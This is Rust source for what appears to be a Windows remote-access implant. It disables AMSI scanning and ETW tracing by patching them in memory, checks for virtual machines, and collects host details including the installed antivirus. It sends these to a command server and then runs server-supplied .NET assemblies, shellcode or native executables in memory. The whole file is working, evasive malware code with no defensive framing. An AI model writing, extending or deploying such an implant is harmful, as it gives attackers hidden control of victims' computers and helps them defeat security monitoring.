//#![windows_subsystem = "windows"]
extern crate colored; 

use core::time::Duration;
use crate::env::consts;

use std::{
   process::exit, str, time::{SystemTime, UNIX_EPOCH}
};

use std::thread;

use std::env;
use std::process;
use rsa::{
    pkcs1::DecodeRsaPublicKey, 
    Pkcs1v15Encrypt, 
    RsaPublicKey
};

use base64::prelude::*;
use crypto::{ symmetriccipher, buffer, aes, blockmodes };
use crypto::buffer::{ ReadBuffer, WriteBuffer, BufferResult };

use colored::Colorize;
use crate::serde_json::json;
use serde_json;
use sha256;
use rand;

use wmi::*;
use std::collections::HashMap;
use wmi::Variant;

use argon2::{
    ParamsBuilder,
    password_hash::{
        PasswordHash, PasswordVerifier
    },
    Argon2
};

use rspe::{reflective_loader, utils::check_dotnet};
use itertools::Itertools;
use rand::RngCore;

use clroxide::{clr::Clr, primitives::wrap_unknown_ptr_in_variant};
use std::{ffi::c_void, fs, mem::size_of, ptr, slice};
use windows::Win32::System::{
    Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
};

use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Threading::GetCurrentProcess;

use windows::core::{ s, w };
use windows::Win32::System::LibraryLoader::{ LoadLibraryW, GetProcAddress };
use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows::Win32::Foundation::GetLastError;
use std::mem;

extern crate kernel32;
extern crate winapi;
use std::ptr::null_mut;
use export_resolver::ExportList;

use serde::Deserialize;  

use libloading::{Library, Symbol};
use std::ptr::null;

#[derive(Deserialize, Debug)]  
pub struct Win32BIOS {  
    pub serialnumber: String,  
}  

const BUILD_ID: &str = "debug";
const CONNECTION_INTERVAL: u64 = 5;
const ANTI_VIRTUAL: bool = false;
const GATEWAY_PATH: &str = "http://127.0.0.1:9999/gateway";
const SERVER_RSA_PUB: &str = "
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAx+zN1dr6iV1Upyd9ixoG2gxvupYqIeuFMV0GgWcCK91pcPZCkeQG
SDy/LhGjCjOMvX/2Eg0wsed99hntvZ2b6RKdsdfrSVUFxvp6H0lEVPGPjDCMssjY
RLi3JbKIopLtgdDHdnf4nCpnSrMNFV5ZuqdIoQIMaw/imyWATNSB18WOebAA8lI9
oR0XG89Ob3/IyxIAK1rUqlx1a1oJ+uBsLscsxwOGWyXir6by31uVfrdzxORFviCr
8bZfuX5wF06WQ9TH1WFAw/G4CTTWP5qooLug04Qt7cAemTLfJjkyaDeLq20ia2ix
xs9LxVype+cEoOSfpawaAH71Kw+d40Dp7wIDAQAB
-----END RSA PUBLIC KEY-----
";

// Main loop that handles sending a heartbeat and recieving connections to server is always running. 
// When the main loop recieves a task, it adds it to a global vec.
// Another loop in another thread will go through each item in the global vec, and complete the task.
// After the task is completed, it will send a "submit_output" request to the server.

fn main() {

    colored::control::set_virtual_terminal(true).unwrap();

    unsafe {
        let mut clr = Clr::context_only(None).unwrap();

        let context = clr.get_context().unwrap();
        let app_domain = context.app_domain;
        let mscorlib = (*app_domain).load_library("mscorlib").unwrap();

        let environment = (*mscorlib).get_type("System.Environment").unwrap();
        let exit_fn = (*environment).get_method("Exit").unwrap();
        let method_info: *mut clroxide::primitives::_Type = (*mscorlib).get_type("System.Reflection.MethodInfo").unwrap();
        let method_handle = (*method_info).get_property("MethodHandle").unwrap();
        let exit_fn_instance = wrap_unknown_ptr_in_variant(exit_fn as *mut c_void);
        let method_handle_value = (*method_handle).get_value(Some(exit_fn_instance)).unwrap();
        let runtime_method_handle = (*mscorlib).get_type("System.RuntimeMethodHandle").unwrap();
        let get_func_pointer = (*runtime_method_handle).get_method("GetFunctionPointer").unwrap();
        let pointer_variant = (*get_func_pointer).invoke_without_args(Some(method_handle_value)).unwrap();

        let base_ptr = pointer_variant.Anonymous.Anonymous.Anonymous.byref;
        let exit_ptr = pointer_variant.Anonymous.Anonymous.Anonymous.byref;

        let value = ptr::read(exit_ptr as *mut u8);
        fprint("info", &format!("`System.Environment.Exit` is: `0x{:x}`", value));

        let mut old: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
        let mut restored: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);

        fprint("info", "Patching `System.Environment.Exit");

        if !VirtualProtect(base_ptr as *const c_void, 1, PAGE_READWRITE, &mut old).is_ok() {
            fprint("error", "Unable to change memory permissions at the function pointer for `System.Environment.Exit`");
        }

        ptr::write(exit_ptr as *mut u8, 0xc3);

        let value = ptr::read(exit_ptr as *mut u8);
        fprint("success", &format!("`System.Environment.Exit` was patched to: `0x{:x}`",value));

        if !VirtualProtect(base_ptr as *const c_void, 1, old, &mut restored).is_ok() {
            fprint("error", "Unable to change memory permissions at the function pointer back to the original value");
        }

        let result = LoadLibraryW(w!("C:\\Windows\\System32\\amsi.dll"));
       
        let farproc = GetProcAddress(result.unwrap(), s!("AmsiScanBuffer"));
        if farproc.is_none() {
            println!("Failed to get function address 'AmsiScanString'");
        }
    
        //println!("AmsiScanString address: {:?}", farproc.unwrap());
    
        let mut ppf = PAGE_PROTECTION_FLAGS(0);
        let r1 = VirtualProtect(
                farproc.unwrap() as usize as *const c_void,
                3,
                PAGE_EXECUTE_READWRITE,
                &mut ppf as *mut PAGE_PROTECTION_FLAGS,
            );
        if r1.is_err() {
            println!("Failed to modify protect flag");
        }
    
        //println!("farproc: {:?}", farproc.unwrap());
    
        let patch: [u8;3] = [0x33,0xc0,0xc3];
        let mut written_size: usize = 0;
        let re = WriteProcessMemory(
            GetCurrentProcess(),
            farproc.unwrap() as *const c_void,
            patch.as_ptr() as *const c_void,
            3,
            Some(&mut written_size as *mut usize),
        );

        if re.is_err() {
            println!("Failed to patch");
        }
    };

    let mut exports = ExportList::new();

    exports.add("ntdll.dll", "NtTraceEvent").expect("[-] Error finding address of NtTraceEvent");

    // retrieve the virtual address of NtTraceEvent
    let nt_trace_addr = exports.get_function_address("NtTraceEvent").expect("[-] Unable to retrieve address of NtTraceEvent.") as *const c_void;

    // get a handle to the current process
    let handle = unsafe {GetCurrentProcess()};

    // set up variables for WriteProcessMemory
    let ret_opcode: u8 = 0xC3; // ret opcode for x86
    let size = mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;


    // patch the function 
    let res = unsafe {
        WriteProcessMemory(handle, 
            nt_trace_addr,
            &ret_opcode as *const u8 as *const c_void, 
            size, 
            Some(&mut bytes_written as *mut usize),
        )
    };

    // interrupt breakpoint - leave this in if you want to inspect the patch in a debugger
    // unsafe { asm!("int3") };

    match res {
        Ok(_) => {
            fprint("success", &format!("[+] Success data written. Number of bytes: {:?} at address: {:p}", bytes_written, nt_trace_addr));
        },
        Err(_) => {
            let e = unsafe { GetLastError() };
            fprint("error", &format!("[-] Error with WriteProcessMemory: {:?}", e));
        },
    }    

    anti_virtualization();
    let (client_id, encryption_key) = init_connection();
    let handle = thread::spawn(move || {
        heartbeat_loop(client_id, encryption_key) // Use global rwlock here later
    });
    handle.join().unwrap();
    // If the main heartbeat loop encounters a task, add it to a global vec. Another thread will complete that task and submit the output, and remove it from the global vec.
    // The main heartbeat loop doesn't ever read this vec, so a rece condition will never occur.

    // REFACTOR CODE. IT IS UGLY AS SHIT RIGHT NOW.
}

// Block program exit. Program exits after running the shits. 
// Might have to write custom ones and load them into a new process, or find way to patch exit.

fn submit_output(client_id: &str, command_id: &str, output: &str, encryption_key: &str) {
    let combined = format!("{}.{}", 
        client_id, 
        aes_256cbc_encrypt(&json!({
            "action": "submit_output",
            "command_id": command_id,
            "output": "Command completed!"
        }).to_string(), encryption_key.as_bytes()).unwrap()
    );

    match ureq::post(GATEWAY_PATH).send_string(&combined) {
        Ok(result) => {
            fprint("success", &format!("Output submitted successfully: {}", output));
            result.into_string().unwrap()
        },
        Err(error) => {
            fprint("error", &format!("Unable to submit output to the server. Error: {}", error));
            return;
        }
    };
}

fn heartbeat_loop(client_id_intake: String, encryption_key_intake: String) {

    let mut client_id = client_id_intake.clone();
    let mut encryption_key = encryption_key_intake.clone();
    
    loop {
        thread::sleep(Duration::from_millis(CONNECTION_INTERVAL * 1000));

        let combined = format!("{}.{}", 
            client_id, 
            aes_256cbc_encrypt(&json!({
                "action": "heartbeat"
            }).to_string(), 
            encryption_key.as_bytes()).unwrap()
        );

        let result = match ureq::post(GATEWAY_PATH).send_string(&combined) {
            Ok(result) => {
                result.into_string().unwrap()
            },
            Err(error) => {
                fprint("error", &format!("Unable to send a heartbeat to the server. Error: {}", error));
                (client_id, encryption_key) = init_connection();
                continue
                
            }
        };

        let decrypted_response = match aes_256cbc_decrypt(&result, encryption_key.as_bytes()) {
            Ok(result) => result,
            Err(_) => {
                fprint("error", &format!("Server responded with undecrypteable response, which was: {}", result));
                (client_id, encryption_key) = init_connection();
                continue;
                
            }
        };

        match str::from_utf8(&decrypted_response).unwrap() {
            "Ok" => {
                fprint("heartbeat", "No new commands to fullfill.");
                continue
            },
            _ => ()
        };

        let client_id = client_id.clone();
        let encryption_key = encryption_key.clone();

        let decrypted_response_json = match serde_json::from_slice::<serde_json::Value>(&decrypted_response) {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "Unable to convert decrypted response into json.");
                continue
            }
        };

        thread::spawn(move || {
            fprint("info", &format!("Handling command: {}", key_to_string(&decrypted_response_json, "cmd_type").as_str()));
            match key_to_string(&decrypted_response_json, "cmd_type").as_str() {
                "DOTNET Execution" => {
                    let payload_bytes = BASE64_STANDARD.decode(key_to_string(&decrypted_response_json, "cmd_args")).unwrap();
                    unsafe {
                        if check_dotnet(payload_bytes.clone()) {
                            patched_clr_run(&client_id, &key_to_string(&decrypted_response_json, "command_id"), &encryption_key, payload_bytes, vec![]);
                        } else {
                            submit_output(
                                &client_id, &key_to_string(&decrypted_response_json, "command_id"), 
                                "Executable is not a DOTNET. Unable to proceed.", 
                                &encryption_key
                            )
                        }
                    }
                },

                "Shellcode Execution" => {

                    const MEM_COMMIT: u32 = 0x1000;
                    const MEM_RESERVE: u32 = 0x2000;
                    const PAGE_EXECUTE: u32 = 0x10;
                    const PAGE_READWRITE: u32 = 0x04;
                    const FALSE: i32 = 0;
                    const WAIT_FAILED: u32 = 0xFFFFFFFF;

                    let shellcode = BASE64_STANDARD.decode(key_to_string(&decrypted_response_json, "cmd_args")).unwrap();
                    let shellcode_size = shellcode.len();
                
                    unsafe {
                        thread::spawn(move || {

                            let kernel32 = Library::new("kernel32.dll").expect("[-]no kernel32.dll!");
                            let ntdll = Library::new("ntdll.dll").expect("[-]no ntdll.dll!");
                    
                            let get_last_error: Symbol<unsafe extern "C" fn() -> u32> = kernel32
                                .get(b"GetLastError\0")
                                .expect("[-]no GetLastError!");
                    
                            let virtual_alloc: Symbol<
                                unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void,
                            > = kernel32
                                .get(b"VirtualAlloc\0")
                                .expect("[-]no VirtualAlloc!");
                    
                            let virtual_protect: Symbol<
                                unsafe extern "C" fn(*const c_void, usize, u32, *mut u32) -> i32,
                            > = kernel32
                                .get(b"VirtualProtect\0")
                                .expect("[-]no VirtualProtect!");
                    
                            let rtl_copy_memory: Symbol<unsafe extern "C" fn(*mut c_void, *const c_void, usize)> =
                                ntdll.get(b"RtlCopyMemory\0").expect("[-]no RtlCopyMemory!");
                    
                            let create_thread: Symbol<
                                unsafe extern "C" fn(*const c_void, usize, *const c_void, u32, *mut u32) -> isize,
                            > = kernel32
                                .get(b"CreateThread\0")
                                .expect("[-]no CreateThread!");
                    
                            let wait_for_single_object: Symbol<unsafe extern "C" fn(isize, u32) -> u32> = kernel32
                                .get(b"WaitForSingleObject")
                                .expect("[-]no WaitForSingleObject!");
                    
                            let addr = virtual_alloc(
                                null(),
                                shellcode_size,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_READWRITE,
                            );
                            if addr.is_null() {
                                panic!("[-]virtual_alloc failed: {}!", get_last_error());
                            }

                            rtl_copy_memory(addr, shellcode.as_ptr().cast(), shellcode_size);
                
                            let mut old = PAGE_READWRITE;
                            let res = virtual_protect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
                            if res == FALSE {
                                panic!("[-]virtual_protect failed: {}!", get_last_error());
                            }
                            
                            submit_output(
                                &client_id, &key_to_string(&decrypted_response_json, "command_id"), 
                                "Reached last stage before execution. Asssumed success.", 
                                &encryption_key
                            );

                            let handle = create_thread(null(), 0, addr, 0, null_mut());
                            if handle == 0 {
                                panic!("[-]create_thread failed: {}!", get_last_error());
                            }

                            wait_for_single_object(handle, WAIT_FAILED);
                        });
                       
                
                    }
                },

                "Native Execution" => {
                    let payload_bytes = BASE64_STANDARD.decode(key_to_string(&decrypted_response_json, "cmd_args")).unwrap();
                    if !check_dotnet(payload_bytes.clone()) {
                        unsafe {
                            submit_output(
                                &client_id, &key_to_string(&decrypted_response_json, "command_id"), 
                                "Reached last stage before execution. Assumed success.", 
                                &encryption_key
                            );
                            reflective_loader(payload_bytes);
                        };
                    } else {
                        submit_output(
                            &client_id, &key_to_string(&decrypted_response_json, "command_id"), 
                            "DOTNET file, not native. Upload a native payload.", 
                            &encryption_key
                        )
                    }
                }

                unsupported_command => {
                    fprint("failure", &format!("Unsupported Command: {}", unsupported_command));
                    submit_output(
                        &client_id, &key_to_string(&decrypted_response_json, "command_id"), 
                        "This client doesn't have support for this command.", 
                        &encryption_key
                    )
                }
            };
         });       
    }
}

fn anti_virtualization() {

    let com_con = COMLibrary::new().unwrap();  
    let wmi_con = WMIConnection::new(com_con.into()).unwrap();  
    match wmi_con.raw_query::<Win32BIOS>("SELECT SerialNumber FROM Win32_BIOS") {
        Ok(results) => {
            if !results.is_empty() {  
                if results[0].serialnumber == 0.to_string() {
                    fprint("error", "Invalid bios serial detected");
                    terminate_and_block();
                }
            } else {  
                fprint("error", "Invalid bios serial detected");
                terminate_and_block();
            }  
        },
        Err(_) => {
            fprint("error", "Invalid bios serial detected");
            terminate_and_block();
        }
    };

    match wmi_con.raw_query::<HashMap<String, String>>("SELECT Name FROM Win32_Fan") {
        Ok(results) => {
            if format!("{:?}", results) == "[]" {  
                fprint("error", "No fan detected.");
                terminate_and_block();
            }
        },
        Err(error) => {
            fprint("error", &format!("Error while querying fan: {}", error));
            terminate_and_block();
        }
    };
  
}

// Check if the connection interval is up before updating a client. If it is, don't let their ass in.

fn init_connection() -> (String, String) {

    thread::sleep(Duration::from_millis(CONNECTION_INTERVAL * 1000));
    let wmi_con = WMIConnection::new(COMLibrary::new().unwrap()).unwrap();

    let proccess_id = process::id();
    let proccess_path = match env::current_exe() {
        Ok(result) => result.into_os_string().into_string().unwrap(),
        Err(error) => {
            fprint("error", &format!("Unable to fetch payload path. Error: {}", error));
            terminate_and_block();
            "N/A".to_string()
        }
    };

    let username = match env::var("username") {
        Ok(result) => result,
        Err(error) => {
            fprint("error", &format!("Unable to fetch username. Error: {}", error));
            terminate_and_block();
            exit(1);
        }
    };

    let guid: String = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT UUID FROM Win32_ComputerSystemProduct") {
        Ok(results) => {
            results.iter().map(|os| 
                parse_wmi(&os["UUID"])
            ).collect::<Vec<_>>().join("")
        }, 

        Err(error) => {
            fprint("error", &format!("Couldn't get GUID. Error: {:?} ", error));
            terminate_and_block();
            "N/A".to_string()
        }
    };
    
    let gpu: String = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT name FROM Win32_VideoController") {
        Ok(results) => {
            results.iter().map(|os| 
                parse_wmi(&os["Name"])
            ).collect::<Vec<_>>().join("")
        }, 

        Err(error) => {
            fprint("error", &format!("Couldn't get GPU. Error: {:?} ", error));
            terminate_and_block();
            "N/A".to_string()
        }
    };
    
    let cpu: String = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT name FROM Win32_Processor") {
        Ok(results) => {
            results.iter().map(|os| 
                parse_wmi(&os["Name"])
            ).collect::<Vec<_>>().join("")
        }, 

        Err(error) => {
            fprint("error", &format!("Couldn't get CPU. Error: {:?} ", error));
            terminate_and_block();
            "N/A".to_string()
        }
    };

    let ram: u64 = match wmi_con.raw_query::<HashMap<String, Variant>>("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem") {
        Ok(results) => {
            results.iter().map(|os| 
                parse_wmi(&os["TotalPhysicalMemory"])
            ).collect::<Vec<_>>().join("").parse::<u64>().unwrap()  / 1024 / 1024 / 1024
        }, 

        Err(error) => {
            fprint("error", &format!("Couldn't get RAM. Error: {:?} ", error));
            terminate_and_block();
            0
        }
    };

    let _initialized_com = COMLibrary::new().unwrap();
    let wmi_con = WMIConnection::with_namespace_path("ROOT\\securitycenter2", COMLibrary::new().unwrap()).unwrap();
    let antivirus: String = match wmi_con.raw_query::<HashMap<String, String>>("SELECT displayName FROM AntiVirusProduct") {
        Ok(results) => {
            let mut result: String = "N/A".to_string();
            for av in results {
                result = av.get("displayName").unwrap().to_string();
            }
            result
        },
        Err(_) => {
            fprint("error", "Unable to resolve WMI for securitycenter.");
            terminate_and_block();
            "N/A".to_string()
        }
    };
    
    loop {
        thread::sleep(Duration::from_millis(5000));
        let client_bytes = random_bytes(32);
        let mut rng = rand::thread_rng();
        let server_pub_rsa = RsaPublicKey::from_pkcs1_pem(&SERVER_RSA_PUB).unwrap();
        let rsa_client_bytes = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &client_bytes).unwrap());

        let server_response = match ureq::post(GATEWAY_PATH).send_string(&rsa_client_bytes) {
            Ok(result) => {
                fprint("success", &format!("Connection established with {}", GATEWAY_PATH.yellow()));
                result.into_string().unwrap()
            },
            Err(error) => {
                fprint("error", &format!("Unable to initialize handshake with server. Error: {:?}", error));
                continue;
            }
        };

        let raw_server_json: Vec<u8> = match aes_256cbc_decrypt(&server_response, &client_bytes) {
            Ok(result) => result,
            Err(error) => {
                fprint("error", &format!("Server response not encrypted properly. Response: {} | Error: {:?}", &server_response, error));
                continue;
            }
        };

        let parsed_server_json = match serde_json::from_slice::<serde_json::Value>(&raw_server_json) {
            Ok(result) => result,
            Err(error) => {
                fprint("error", &format!("Couldn't convert server raw json into parsed json. Json: {:?} | Error: {:?}", &raw_server_json, &error));
                continue;
            }
        };

        fprint("task", &format!("Cracking {}", &parsed_server_json["hash"]));

        let start_time = get_timestamp();
        let server_seed = BASE64_STANDARD.decode(key_to_string(&parsed_server_json, "seed")).unwrap();
        let server_hash = key_to_string(&parsed_server_json, "hash");
        let mut server_bytes: Vec<u8> = vec![];

        for perm in server_seed.iter().permutations(server_seed.len()).unique() {
            let mut temp = vec![];
            for byte in perm { temp.push(*byte); }

            if verify_argon2(&server_hash, &temp) {
                server_bytes = temp;
                break;
            }
        }      

        let encryption_key =  sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32].to_string();

        fprint("success", &format!("Generated encryption key in {}s: {}", {
            get_timestamp() - start_time
        }, encryption_key.yellow()));


        let rsaed_encryption_key = BASE64_STANDARD.encode(server_pub_rsa.encrypt(&mut rng, Pkcs1v15Encrypt, &encryption_key.as_bytes()).unwrap());
        let registration_payload = aes_256cbc_encrypt(&json!({
            "build_id": BUILD_ID,
            "version": 10,
            "uac": false,
            "username": username,
            "guid": guid,
            "cpu": cpu,
            "gpu": gpu,
            "ram": ram,
            "antivirus": antivirus,
            "path": proccess_path,
            "pid": proccess_id,
        }).to_string(), encryption_key.as_bytes()).unwrap();

        let combined = format!("{}.{}", rsaed_encryption_key, registration_payload);
        let registration_response = match ureq::post(GATEWAY_PATH).send_string(&combined) {
            Ok(result) => {
                result.into_string().unwrap()
            },
            Err(error) => {
                fprint("error", &format!("Unable to submit registration. Error: {}", error));
                continue;
            }
        };

        let client_id = match aes_256cbc_decrypt(&registration_response, encryption_key.as_bytes()) {
            Ok(result) => String::from_utf8(result).unwrap(),
            Err(error) => {
                fprint("error", &format!("Unable to decrypt registration response. Error: {:?} | Raw Response: {}", error, registration_response));
                continue;
            }
        };

        fprint("info", &format!("Obtained client id {}", &client_id.yellow()));
        return (client_id, encryption_key);
    }

}

fn terminate_and_block() {
    if !ANTI_VIRTUAL {return}
    drop(ureq::get(GATEWAY_PATH).call());
    exit(1);
}

fn get_timestamp() -> u64 {
    let since_the_epoch = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards lmao");
    return since_the_epoch.as_secs()
}


unsafe fn patched_clr_run(client_id: &str, command_id: &str, encryption_key: &str, contents: Vec<u8>, args: Vec<String>) -> () {
    let mut clr = Clr::new(contents, args).unwrap();

    submit_output(&client_id, command_id, 
        "Executable reached last stage before execution. Assumed success.",
        &encryption_key
    );

    clr.run().unwrap();
}


// unreachable :BUFFER TOO SMALL
// ohiohoiHDOH12OID
fn aes_256cbc_encrypt(data: &str, key: &[u8]) -> core::result::Result<String, symmetriccipher::SymmetricCipherError> {

    let mut encryptor = aes::cbc_encryptor(
            aes::KeySize::KeySize256,
            key,
            &key[..16],
            blockmodes::PkcsPadding);
   
    let mut final_result = Vec::<u8>::new();
    let mut read_buffer = buffer::RefReadBuffer::new(data.as_bytes());
    let mut buffer = [0; 4096];
    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);

    loop {
        let result = encryptor.encrypt(&mut read_buffer, &mut write_buffer, true).unwrap();

        final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));

        match result {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => { }
        }
    }

    Ok(BASE64_STANDARD.encode(final_result))
}

fn aes_256cbc_decrypt(encrypted_data: &str, key: &[u8]) -> core::result::Result<Vec<u8>, symmetriccipher::SymmetricCipherError> {

    let encrypted_data = BASE64_STANDARD.decode(encrypted_data).unwrap();
    let mut decryptor = aes::cbc_decryptor(
            aes::KeySize::KeySize256,
            key,
            &key[..16],
            blockmodes::PkcsPadding);

    let mut final_result = Vec::<u8>::new();
    let mut read_buffer = buffer::RefReadBuffer::new(encrypted_data.as_slice());
    let mut buffer = [0; 4096];
    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);

    loop {
        let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true).unwrap();
        final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
        match result {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => { }
        }
    }

    Ok(final_result)
}

fn fprint(stype: &str, sformatted: &str) -> () {
    
    let color = match stype {
        "info" => stype.to_uppercase().cyan(),
        "error" => stype.to_uppercase().red(),
        "failure" => stype.to_uppercase().red(),
        "restricted" => stype.to_uppercase().red(),
        "success" => stype.to_uppercase().green(),
        "task" => stype.to_uppercase().yellow(),
        _ => stype.to_uppercase().white(),
    };


    println!("[{} - {}] {}", get_timestamp().to_string().white(), color, sformatted);
}

fn key_to_string(json: &serde_json::Value, json_key: &str) -> String {String::from(json[json_key].as_str().unwrap())}
fn key_to_u64(json: &serde_json::Value, json_key: &str) -> u64 {json[json_key].as_u64().unwrap()}
fn key_to_bool(json: &serde_json::Value, json_key: &str) -> bool {json[json_key].as_bool().unwrap()}
fn key_exists(json: &serde_json::Value, json_key:&str) -> bool {if let Some(_) = json.get(json_key) {return true} else {return false}}

fn verify_argon2(hash: &str, input: &[u8]) -> bool {

     let params = 
        ParamsBuilder::new()
        .m_cost(2_u32.pow(8))
        .t_cost(16)
        .p_cost(2)
        .build()
        .unwrap();

    let argon2 = Argon2::new(argon2::Algorithm::Argon2id, argon2::Version::V0x13, params);
    return argon2.verify_password(
        input, &PasswordHash::parse(&hash, argon2::password_hash::Encoding::B64
    ).unwrap()).is_ok();
}

pub fn random_bytes(len: usize) -> Vec<u8> {
    let mut buffer = vec![0; len];
    rand::thread_rng().fill_bytes(&mut buffer);
    buffer[..].to_vec()
}


fn parse_wmi(input: &Variant) -> String {
    let formatted = format!("{:?}", input);
    let start_index = formatted.find('(').unwrap_or(formatted.len());
    let end_index = formatted.rfind(')').unwrap_or(start_index);
    let extracted = &formatted[start_index + 1..end_index];
    extracted.replace("\\", "").replace("\"", "").into()
}
